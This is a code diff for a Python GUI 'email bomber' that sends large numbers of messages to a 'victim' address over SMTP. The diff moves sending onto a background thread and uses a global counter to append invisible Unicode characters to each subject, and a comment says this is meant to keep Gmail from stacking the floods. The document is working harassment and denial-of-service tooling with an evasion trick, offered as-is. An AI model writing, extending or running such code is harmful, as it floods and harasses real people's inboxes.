@@ -5,6 +5,7 @@ import smtplib
 from email.message import EmailMessage
 from res.icon import runtime_icon
 import tkinter as tk
+import threading
 import tempfile
 import os
 
@@ -100,11 +101,11 @@ def create_gui() -> tk.Tk:
     btn_save_fields.place(x = 20, y = 270)
     
     # Load data section
-    btn_load_fields = tk.Button(root, text = 'Load field', bg = 'black', fg = 'white', width = 15, command = load_fields)
+    btn_load_fields = tk.Button(root, text = 'Load fields', bg = 'black', fg = 'white', width = 15, command = load_fields)
     btn_load_fields.place(x = 140, y = 270)
     
     # Send emails section
-    btn_send_mails = tk.Button(root, text = '>> Send <<', bg = 'black', fg = 'white', width = 15, command = send_emails)
+    btn_send_mails = tk.Button(root, text = '>> Send <<', bg = 'black', fg = 'white', width = 15, command = thread_send_emails)
     btn_send_mails.place(x = 260, y = 270)
     
     # Improvised separator
@@ -136,11 +137,13 @@ def on_closing(gui: tk.Tk, iconfile_path: str):
         iconfile_path (str): Path to the temporary icon file
     """
     
+    # Delete icon
     try:
         os.remove(iconfile_path)
     except Exception:
         pass
     
+    # Exit
     gui.destroy()
     exit(0)
 
@@ -218,7 +221,8 @@ def print_text(text: str, tag_color: str = 'white') -> None:
 # Main methods
 #
 
-def create_message(i: int) -> EmailMessage:
+message_number = 0
+def create_message() -> EmailMessage:
     """
     Create an email with all of the attributes
 
@@ -229,6 +233,8 @@ def create_message(i: int) -> EmailMessage:
         EmailMessage: Packed email
     """
     
+    global message_number
+    
     # Get user input
     victim_address = txt_victim_address.get('1.0', 'end-1c')
     email_subject = txt_email_subject.get('1.0', 'end-1c')
@@ -238,7 +244,7 @@ def create_message(i: int) -> EmailMessage:
     
     # Create email
     msg = EmailMessage()
-    msg['Subject'] = email_subject + (u'\u200e' * i) # add unicode to subject so gmail does not stack the emails with \u200e being an invisible char >:)
+    msg['Subject'] = email_subject + (u'\u200e' * message_number) # Add Unicode to the subject so Gmail does not stack the emails, with \u200e being an invisible character >:)
     msg['From'] = f'{attacker_name} <{attacker_address}>'
     msg['To'] = victim_address
     msg.set_content(email_body)
@@ -271,10 +277,30 @@ def server_login() -> smtplib.SMTP:
     
     return server
 
+is_sending = False
+def thread_send_emails() -> None:
+    """
+    Start the bombing
+    """
+
+    # Do nothing if we are already bombing
+    global is_sending
+    if is_sending:
+        print_text('> Wait until the previous emails are sent')
+        return
+    
+    # Send emails
+    email_thread = threading.Thread(target = send_emails)
+    email_thread.start()
+    
+
 def send_emails() -> None:
     """
     Connect to server and send the emails
     """
+    global message_number
+    global is_sending
+    is_sending = True
     
     # Attempt to login
     email_server = server_login()
@@ -291,13 +317,15 @@ def send_emails() -> None:
     
     # Send emails
     for i in range(amount):
-        email_message = create_message(i)
+        email_message = create_message()
         email_server.send_message(email_message)
         print_text(f'> Sent email number {i + 1}')
+        message_number += 1
     
-    # Exit
+    # Close connection to SMTP
     email_server.quit()
     print_text('> Emails have been sent successfully', 'green')
+    is_sending = False
 
 def main() -> None:
     """
